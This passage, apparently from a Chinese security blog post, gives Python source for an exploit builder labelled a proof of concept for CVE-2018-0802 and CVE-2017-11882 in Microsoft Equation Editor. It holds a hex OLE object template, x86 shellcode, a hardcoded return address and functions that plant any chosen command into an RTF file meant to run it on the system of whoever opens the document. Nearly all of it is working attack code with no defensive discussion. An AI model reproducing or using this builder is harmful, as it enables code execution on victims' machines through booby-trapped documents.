001201E1200000026060F001A00FFFFFFFF000010000000C0FFFFFFC6FFFFFFE01D0000660100000B00000026060F000C004D61746854797065000020001C000000FB0280FE0000000000009001000000000402001054696D6573204E657720526F6D616E00FEFFFFFF6B2C0A0700000A0000000000040000002D0100000C000000320A600190160A000000313131313131313131310C000000320A6001100F0A000000313131313131313131310C000000320A600190070A000000313131313131313131310C000000320A600110000A000000313131313131313131310A00000026060F000A00FFFFFFFF0100000000001C000000FB021000070000000000BC02000000000102022253797374656D000048008A0100000A000600000048008A01FFFFFFFF7CEF1800040000002D01010004000000F0010000030000000000</span></span><br><span class=\"line\"><span class=\"string\">&#125;&#123;\\result &#123;\\rtlch\\fcs1 \\af0 \\ltrch\\fcs0 \\dn8\\insrsid95542\\charrsid95542 &#123;\\pict&#123;\\*\\picprop\\shplid1025&#123;\\sp&#123;\\sn shapeType&#125;&#123;\\sv 75&#125;&#125;&#123;\\sp&#123;\\sn fFlipH&#125;&#123;\\sv 0&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fFlipV&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLockAspectRatio&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn pictureGray&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn pictureBiLevel&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fRecolorFillAsPicture&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fUseShapeAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFilled&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fHitTestFill&#125;&#123;\\sv 1&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fillShape&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fillUseRect&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fNoFillHitTest&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLine&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fPreferRelativeResize&#125;&#123;\\sv 1&#125;&#125;&#123;\\sp&#123;\\sn fReallyHidden&#125;&#123;\\sv 0&#125;&#125;</span></span><br><span class=\"line\"><span class=\"string\">&#123;\\sp&#123;\\sn fScriptAnchor&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fFakeMaster&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fCameFromImgDummy&#125;&#123;\\sv 0&#125;&#125;&#123;\\sp&#123;\\sn fLayoutInCell&#125;&#123;\\sv 1&#125;&#125;&#125;\\picscalex100\\picscaley100\\piccropl0\\piccropr0\\piccropt0\\piccropb0</span></span><br><span class=\"line\"><span class=\"string\">\\picw353\\pich600\\picwgoal200\\pichgoal340\\wmetafile8\\bliptag1846300541\\blipupi2307&#123;\\*\\blipuid 6e0c4f7df03da08a8c6c623556e3c652&#125;0100090000035100000000001200000000000500000009020000000005000000020101000000050000000102ffffff00050000002e0118000000050000000b02</span></span><br><span class=\"line\"><span class=\"string\">00000000050000000c02200240011200000026060f001a00ffffffff000010000000c0ffffffaaffffff00010000ca0100000b00000026060f000c004d61746854797065000040000a00000026060f000a00ffffffff010000000000030000000000&#125;&#125;&#125;&#125;\\par&#125;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">OBJDATA_TEMPLATE = <span class=\"string\">R&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">01050000020000000b0000004571756174696f6e2e33000000000000000000000c0000d0cf11e0a1</span></span><br><span class=\"line\"><span class=\"string\">b11ae1000000000000000000000000000000003e000300feff090006000000000000000000000001</span></span><br><span class=\"line\"><span class=\"string\">0000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">fffffffffffffffffffffffffffffffffffffffffffffffffffffffdffffff04000000fefffffffe</span></span><br><span class=\"line\"><span class=\"string\">fffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffff52006f006f007400200045006e0074007200790000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000016000500ffffffffffffffff0200000002ce020000000000c0000000000000460000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000008020cea5613cd30103000000000200000000000001004f006c0065000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000a000201ffffffffffffffffffffffff00000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000000000000000000001400000000000000010043006f</span></span><br><span class=\"line\"><span class=\"string\">006d0070004f0062006a000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000120002010100000003000000ffffffff0000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000010000006600000000</span></span><br><span class=\"line\"><span class=\"string\">00000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000012000201ffffffff04000000ff</span></span><br><span class=\"line\"><span class=\"string\">ffffff00000000000000000000000000000000000000000000000000000000000000000000000003</span></span><br><span class=\"line\"><span class=\"string\">0000000600000000000000feffffff02000000fefffffffeffffff050000000600000007000000fe</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffff01000002080000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000000000000000000000100feff030a0000ffffffff02</span></span><br><span class=\"line\"><span class=\"string\">ce020000000000c000000000000046170000004d6963726f736f6674204571756174696f6e20332e</span></span><br><span class=\"line\"><span class=\"string\">30000c0000004453204571756174696f6e000b0000004571756174696f6e2e3300f439b271000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000030004</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000000000000000000000000000001c00000002009ec4a900000000000000c8a75c00c4</span></span><br><span class=\"line\"><span class=\"string\">ee5b0000000000030101030a0a01085a5a33c099b202c1e2082be2e8ffffffffc35b50648b40308b</span></span><br><span class=\"line\"><span class=\"string\">400899b203c1e21066ba120c03c28d5b1c53ffe02020202000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000004500710075</span></span><br><span class=\"line\"><span class=\"string\">006100740069006f006e0020004e0061007400690076006500000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000020000200ffffffffffffffffffffffff0000000000</span></span><br><span class=\"line\"><span class=\"string\">0000000000000000000000000000000000000000000000000000000000000004000000c500000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000ffffffffffffffffff</span></span><br><span class=\"line\"><span class=\"string\">ffffff00000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">000000000000000000000000000000000000000000000000000000000000000000000000000000ff</span></span><br><span class=\"line\"><span class=\"string\">ffffffffffffffffffffff0000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000ffffffffffffffffffffffff000000000000000000000000000000000000000000</span></span><br><span class=\"line\"><span class=\"string\">00000000000000000000000000000000000000000000000000000001050000050000000d0000004d</span></span><br><span class=\"line\"><span class=\"string\">45544146494c4550494354003421000035feffff9201000008003421cb010000010009000003c500</span></span><br><span class=\"line\"><span class=\"string\">000002001c00000000000500000009020000000005000000020101000000050000000102ffffff00</span></span><br><span class=\"line\"><span class=\"string\">050000002e0118000000050000000b0200000000050000000c02a001201e1200000026060f001a00</span></span><br><span class=\"line\"><span class=\"string\">ffffffff000010000000c0ffffffc6ffffffe01d0000660100000b00000026060f000c004d617468</span></span><br><span class=\"line\"><span class=\"string\">54797065000020001c000000fb0280fe0000000000009001000000000402001054696d6573204e65</span></span><br><span class=\"line\"><span class=\"string\">7720526f6d616e00feffffff6b2c0a0700000a0000000000040000002d0100000c000000320a6001</span></span><br><span class=\"line\"><span class=\"string\">90160a000000313131313131313131310c000000320a6001100f0a00000031313131313131313131</span></span><br><span class=\"line\"><span class=\"string\">0c000000320a600190070a000000313131313131313131310c000000320a600110000a0000003131</span></span><br><span class=\"line\"><span class=\"string\">31313131313131310a00000026060f000a00ffffffff0100000000001c000000fb02100007000000</span></span><br><span class=\"line\"><span class=\"string\">0000bc02000000000102022253797374656d000048008a0100000a000600000048008a01ffffffff</span></span><br><span class=\"line\"><span class=\"string\">7cef1800040000002d01010004000000f0010000030000000000</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">stage1=<span class=\"string\">&quot;\\xB8\\x44\\xEB\\x71\\x12\\xBA\\x78\\x56\\x34\\x12\\x31\\xD0\\x8B\\x08\\x8B\\x09\\x8B\\x09\\x66\\x83\\xC1\\x3C\\x31\\xDB\\x53\\x51\\xBE\\x64\\x3E\\x72\\x12\\x31\\xD6\\xFF\\x16\\x53\\x66\\x83\\xEE\\x4C\\xFF\\x10&quot;</span></span><br><span class=\"line\">stage1=stage1.ljust(<span class=\"number\">44</span>,<span class=\"string\">&#x27;\\x90&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">COMMAND_OFFSET = (<span class=\"number\">0x949</span>+<span class=\"number\">0x2b</span>)*<span class=\"number\">2</span></span><br><span class=\"line\">COMD_LEN = (<span class=\"number\">0x94</span>-<span class=\"number\">0x2b</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_ole_exec_primitive</span>(<span class=\"params\">command</span>):</span><br><span class=\"line\">    hex_command = command.encode(<span class=\"string\">&quot;hex&quot;</span>)</span><br><span class=\"line\">    hex_command += (COMD_LEN - <span class=\"built_in\">len</span>(command)) * <span class=\"string\">&quot;20&quot;</span></span><br><span class=\"line\">    hex_command += <span class=\"string\">&quot;2500&quot;</span></span><br><span class=\"line\">    objdata_hex_stream = OBJDATA_TEMPLATE.translate(<span class=\"literal\">None</span>, <span class=\"string\">&quot;\\r\\n&quot;</span>)</span><br><span class=\"line\">    ole_data = objdata_hex_stream[:COMMAND_OFFSET] + hex_command + objdata_hex_stream[COMMAND_OFFSET + <span class=\"built_in\">len</span>(hex_command):]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> OBJECT_HEADER + ole_data</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">create_rtf</span>(<span class=\"params\">header, trailer, command</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(command) &gt; COMD_LEN:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&#x27;[!] Command must be shorter than 109 bytes!&#x27;</span></span><br><span class=\"line\">        sys.exit(<span class=\"number\">0</span>)</span><br><span class=\"line\">    ole = create_ole_exec_primitive(command + <span class=\"string\">&quot; #&quot;</span>)</span><br><span class=\"line\">    payload=<span class=\"string\">&#x27;\\x1c\\x00\\x00\\x00\\x02\\x00\\x9e\\xc4\\xa9\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\xa7\\\\\\x00\\xc4\\xee[\\x00\\x00\\x00\\x00\\x00\\x03\\x01\\x01\\x03\\n\\n\\x01\\x08ZZ&#x27;</span></span><br><span class=\"line\">    payload+=stage1</span><br><span class=\"line\">    payload+=pack(<span class=\"string\">&#x27;&lt;I&#x27;</span>,<span class=\"number\">0x00402114</span>) <span class=\"comment\"># ret</span></span><br><span class=\"line\">    payload+=<span class=\"string\">&#x27;\\x00&#x27;</span>*<span class=\"number\">2</span></span><br><span class=\"line\">    payload+=command</span><br><span class=\"line\">    payload=payload.ljust(<span class=\"number\">197</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> header + ole + OBJECT_TRAILER + OBJCLASS11882 + payload.encode(<span class=\"string\">&#x27;hex&#x27;</span>) + OBJECT_TRAILER11882  + trailer</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getrheader</span>(<span class=\"params\">file</span>):</span><br><span class=\"line\">    input_file = <span class=\"built_in\">open</span>(file,<span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\">    r_header = input_file.split(<span class=\"string\">&quot;&#123;\\*\\datastore&quot;</span>)[<span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r_header</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    <span class=\"built_in\">print</span> LOGO</span><br><span class=\"line\">    parser = argparse.ArgumentParser(description=<span class=\"string\">&quot;PoC for CVE-2018-0802 And CVE-2017-11882&quot;</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-c&quot;</span>, <span class=\"string\">&quot;--command&quot;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;Command run in target system&quot;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&#x27;-o&#x27;</span>, <span class=\"string\">&quot;--output&quot;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;Output exploit rtf&quot;</span>, required=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    parser.add_argument(<span class=\"string\">&quot;-i&quot;</span>, <span class=\"string\">&quot;--input&quot;</span>, <span class=\"built_in\">help</span>=<span class=\"string\">&quot;Input normal rtf.&quot;</span>, required=<span class=\"literal\">False</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    args = parser.parse_args()</span><br><span class=\"line\">    <span class=\"keyword\">if</span> args.<span class=\"built_in\">input</span> != <span class=\"literal\">None</span>:</span><br><span class=\"line\">        r_header = getrheader(args.<span class=\"built_in\">input</span>)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        r_header = RTF_HEADER</span><br><span class=\"line\"></span><br><span class=\"line\">    rtf_content = create_rtf(r_header, RTF_TRAILER,  args.command)</span><br><span class=\"line\"></span><br><span class=\"line\">    output_file = <span class=\"built_in\">open</span>(args.output, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\">    output_file.write(rtf_content)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;[*] Done ! output file --&gt; &quot;</span> + args.output </span><br></pre></td></tr></table></figure>","categories":[],"tags":[{"name":"Windows","path":"api/tags/Windows.json"},{"name":"信息安全","path":"api/tags/信息安全.json"}]}